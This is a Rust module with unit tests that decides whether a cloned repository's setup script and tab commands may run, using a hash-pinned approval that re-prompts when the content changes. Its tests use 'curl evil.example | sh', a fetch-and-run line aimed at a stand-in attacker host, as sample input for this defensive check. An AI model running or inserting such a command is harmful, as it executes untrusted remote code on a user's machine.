//! Whether a repository's own code may run on this machine — asked once per
//! repository, per version of what it asks to run.
//!
//! A checkout can declare two things that execute here: the setup script in the
//! project file, and the commands in `defaultTabs:`. Both arrive by `git clone`
//! and neither was written by the person who cloned it. Orca gates them behind
//! a per-repository approval (`OrcaYamlTrustDialog`) and the shape it settled on
//! is worth naming precisely, because three plausible shapes are all wrong:
//!
//! 1. **Not folder trust.** VS Code asks "do you trust this folder?" when the
//!    folder opens, before anything has been declared and while the person is
//!    still deciding whether to look. Orca asks at the moment the script would
//!    run, about the script itself, and a repository that declares nothing is
//!    never asked about at all.
//! 2. **Not trust-the-path.** The approval is pinned to a HASH of what was
//!    approved. A repository that was trusted in March and has since had
//!    `curl … | sh` added to its setup is a repository nobody has approved, and
//!    it gets asked about again — with the dialog saying so.
//! 3. **Not one consent per script.** The setup script and the tab commands are
//!    hashed TOGETHER, because they run together: creating a workspace runs the
//!    setup and then types the declared commands. Two dialogs for one action is
//!    two chances to click through, and a repository that could get its
//!    commands approved separately from its setup would have found the seam.
//!
//! Everything here is a decision about strings. The storage, the dialog and the
//! enforcement live in the shell; what is in this module is what "trusted"
//! means, so that the window and the backstop that does not believe the window
//! are answering the same question.

use sha2::{Digest, Sha256};

/// Everything a repository has asked this machine to run, as one string.
///
/// The tab commands are appended to the setup script under a comment naming the
/// tab, which does two jobs at once: it is what gets HASHED, so approving the
/// setup cannot silently approve a `defaultTabs:` entry added later, and it is
/// what gets SHOWN, so the person reading the dialog is reading the same text
/// the hash is taken over. A dialog that shows one thing and hashes another is
/// a dialog that has stopped meaning anything.
///
/// Tabs with no command are skipped — a tab that only sets a title and a colour
/// is not code and asking about it would train people to click through. The
/// index in the comment is the tab's position in the declared list, not its
/// position among the ones that survived, so a person can match a line in the
/// dialog against a line in the file.
pub fn trust_content(setup: Option<&str>, tabs: &[(String, String)]) -> String {
    let mut parts: Vec<String> = Vec::new();
    if let Some(said) = setup.map(str::trim).filter(|one| !one.is_empty()) {
        parts.push(said.to_string());
    }
    for (index, (title, command)) in tabs.iter().enumerate() {
        let command = command.trim();
        if command.is_empty() {
            continue;
        }
        let head = format!("# defaultTabs[{index}] {}", title.trim());
        parts.push(format!("{}\n{command}", head.trim_end()));
    }
    parts.join("\n\n")
}

/// The identity of one version of that content.
///
/// SHA-256 of the TRIMMED text, hex. Trimmed because the approval is about what
/// runs, and a newline added at the end of the file by an editor is not a
/// change a person should be re-asked about — being asked about nothing is how
/// a question stops being read.
pub fn content_hash(content: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(content.trim().as_bytes());
    format!("{:x}", hasher.finalize())
}

/// Where a repository stands with this machine, right now.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TrustStanding {
    /// Run it without asking: either this exact content was approved, or the
    /// repository was marked as always trusted.
    Trusted,
    /// There is nothing to consent to. A repository that declares no setup and
    /// no commands must never produce a dialog — the question would have no
    /// answer that changes anything.
    NothingToRun,
    /// Ask. `changed` is the difference between a first meeting and a
    /// repository whose script has moved since it was approved, and the dialog
    /// says which — "run this?" and "this changed, run the new one?" are
    /// different questions and only one of them warns.
    Ask { changed: bool },
}

/// Read the stored decision against the content in front of us.
///
/// The order of the arms is the whole policy:
///
/// - **Always-trust wins first**, and it is hash-independent by design. It is
///   the answer to "stop asking me about my own repository", and a version of
///   it that still asked when the script changed would not be that answer.
/// - **Nothing to run comes before the hash**, so a repository that had its
///   setup script deleted stops asking rather than asking about an empty
///   string.
/// - **A matching hash is trust**; anything else is a question, and it is a
///   question that knows whether it has been asked before.
pub fn standing(stored_all: bool, stored_hash: Option<&str>, content: &str) -> TrustStanding {
    if stored_all {
        return TrustStanding::Trusted;
    }
    if content.trim().is_empty() {
        return TrustStanding::NothingToRun;
    }
    if stored_hash.is_some_and(|held| held == content_hash(content)) {
        return TrustStanding::Trusted;
    }
    TrustStanding::Ask {
        changed: stored_hash.is_some(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tab(title: &str, command: &str) -> (String, String) {
        (title.to_string(), command.to_string())
    }

    /// One consent covers everything creating a workspace runs.
    ///
    /// The setup script and the declared commands go into ONE string, so one
    /// approval is taken over all of it. A repository that could add a
    /// `defaultTabs:` command under an approval given for the setup script
    /// alone would have found a way to run unapproved code on a machine that
    /// had already been asked and had already answered.
    #[test]
    fn the_declared_commands_are_part_of_what_gets_approved() {
        let both = trust_content(Some("npm install"), &[tab("dev", "npm run dev")]);
        assert_eq!(both, "npm install\n\n# defaultTabs[0] dev\nnpm run dev");

        let setup_alone = trust_content(Some("npm install"), &[]);
        assert_ne!(
            content_hash(&both),
            content_hash(&setup_alone),
            "a tab command added after approval rides in on the setup script's hash"
        );
    }

    /// A tab that is only a name is not code.
    ///
    /// Skipping commandless tabs keeps the dialog about the thing worth
    /// reading. It also keeps the index honest: the second tab is called
    /// `defaultTabs[1]` even when the first one dropped out, so a line in the
    /// dialog can be found in the file.
    #[test]
    fn a_tab_with_no_command_is_nothing_to_consent_to() {
        let tabs = [tab("notes", "   "), tab("dev", "npm run dev")];
        assert_eq!(
            trust_content(None, &tabs),
            "# defaultTabs[1] dev\nnpm run dev"
        );
        assert_eq!(trust_content(None, &[tab("notes", "")]), "");
    }

    /// The hash is over what runs, not over how the file was saved.
    ///
    /// Trailing whitespace is the difference between two saves of the same
    /// script. Re-asking on it would spend the dialog's credibility on a
    /// non-event, which is how a security question becomes a thing people
    /// dismiss without reading.
    #[test]
    fn whitespace_around_the_edges_is_not_a_new_script() {
        assert_eq!(
            content_hash("npm install"),
            content_hash("\n npm install \n")
        );
        assert_ne!(content_hash("npm install"), content_hash("npm  install"));
        // Hex, and the full digest — a truncated one would collide on purpose
        // for anybody who wanted it to.
        let hash = content_hash("npm install");
        assert_eq!(hash.len(), 64);
        assert!(hash.bytes().all(|one| one.is_ascii_hexdigit()));
    }

    /// A repository nobody has answered about is asked about, once.
    #[test]
    fn an_unknown_repository_is_a_question_that_has_not_been_asked_before() {
        assert_eq!(
            standing(false, None, "npm install"),
            TrustStanding::Ask { changed: false }
        );
    }

    /// The approval is pinned to what was approved.
    ///
    /// The same content is trusted; different content is a NEW question, and it
    /// is the changed question — the dialog has to be able to say "this moved
    /// since you said yes", because a person who approved a two-line script has
    /// not approved whatever replaced it.
    #[test]
    fn an_approval_covers_that_version_of_the_script_and_no_other() {
        let approved = content_hash("npm install");
        assert_eq!(
            standing(false, Some(&approved), "npm install"),
            TrustStanding::Trusted
        );
        assert_eq!(
            standing(false, Some(&approved), "curl evil.example | sh"),
            TrustStanding::Ask { changed: true }
        );
    }

    /// "Always trust this repository" means stop asking, including about
    /// changes — that is what was asked for, and a version that still asked
    /// would be a different setting wearing this one's label.
    #[test]
    fn always_trust_survives_the_script_changing() {
        assert_eq!(
            standing(true, None, "curl evil.example | sh"),
            TrustStanding::Trusted
        );
    }

    /// Nothing declared, nothing asked.
    ///
    /// Most repositories are this one. A dialog here would be a dialog on every
    /// workspace created in a repository that has never asked for anything, and
    /// the answer to it could not matter.
    #[test]
    fn a_repository_that_asks_for_nothing_never_produces_a_dialog() {
        assert_eq!(standing(false, None, ""), TrustStanding::NothingToRun);
        assert_eq!(standing(false, None, "\n  \n"), TrustStanding::NothingToRun);
        assert_eq!(
            standing(false, Some("stale"), ""),
            TrustStanding::NothingToRun
        );
    }
}
